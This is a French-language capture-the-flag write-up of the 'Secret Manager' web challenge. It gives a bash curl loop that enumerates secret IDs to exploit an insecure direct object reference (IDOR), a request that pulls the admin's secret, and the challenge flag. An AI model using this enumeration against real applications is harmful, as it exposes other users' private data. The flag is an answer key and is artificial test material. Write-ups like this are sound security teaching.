# Description
L'entreprise PHPBoomer a développé une autre application que Winventory, en améliorant sa sécurité.
Secret Manager vous permet de stocker vos secrets sans que personne puisse y accéder.
Connaissant leur passé, on sait que la sécurité n'est pas maître chez eux.. Vous pouvez tester l'application?
Accès au challenge : http://secret.ctf.midnightflag.fr/

# Write UP
Pour se connecter à se challenge, il suffit de fournir un pseudo.
On créé donc un pseudo, et on commence à regarder l'application, elle ressemble beaucoup à Winventory, normal, puisque c'est la même entreprise qui l'a développé.
<!-- ![image](https://github.com/MidnightFlag/CTF2021/blob/main/Web/Secret_Manager/images/mainpage.png) -->

On voit que l'on peut juste ajouter des secrets et voir ceux que l'on possède pour potentiellement les modifier / supprimer.
Si l'on analyse la requête qui part quand on clique sur "modify" on observe ceci:
```
http: // Host:/IDOR/?page=manageOneSecret
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0 Accept: text/html, application/xhtml+xml, application/xml;q=0.9, image/webp,*/*;q=0.8 Accept-Language: fr, fr-FR; q=0.8, en-US; q=0.5, en; q=0.3 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 4 Origin: http: // DNT: 1 Connection: keep-aliv Referer: http: // /IDOR/?page=manageSecrets Cookie: PHPSESSID=h8om8c3g9k8a4o13sq6iqqp1bj Upgrade-Insecure-Requests: 1 144= post: http/1.1 200 Date: Sun, 27 Dec 2020 20:36:36 GMT Server: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.4.1 X-Powered-By: PHP/7.4.1 Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate Pragma: no-cache Content-Length: 6056 Keep-Alive: timeout=5, max=99 Connection: Keep-Alive Content-Type: text/html; charset=UTF-8
```
<!-- ![image](https://github.com/MidnightFlag/CTF2021/blob/main/Web/Secret_Manager/images/mainpage.png) -->

On pourrait tenter des injection SQL dans le champ passé, mais cela n'est pas efficace, en effet, côté serveur, cela est bien géré.
On peut donc penser à une injection de type IDOR, pour pouvoir accéder aux secrets de tout le monde, la payload est donc la suivante:
`$ for i in `seq 1 200`; do curl -X POST --data "$i=" "http://localhost/IDOR/?page=manageOneSecret" --silent ; done`
<!-- ![image](https://github.com/MidnightFlag/CTF2021/blob/main/Web/Secret_Manager/images/payload.png) -->

Cela marche! On réussi à accéder aux secrets de tout le monde. Le secret de l'admin se trouve à l'id 142:
curl -X POST --data "142=" "http://localhost/IDOR/?page=manageOneSecret" --silent
<!-- ![image](https://github.com/MidnightFlag/CTF2021/blob/main/Web/Secret_Manager/images/flag.png) -->
<input class="input--style=5" type="text" value="MCTF{IDOR_1nj3t10n_t0_st341_s3cr3ts}" name="content" required>``

# Flag
`MCTF{IDOR_1nj3t10n_t0_st341_s3cr3ts}`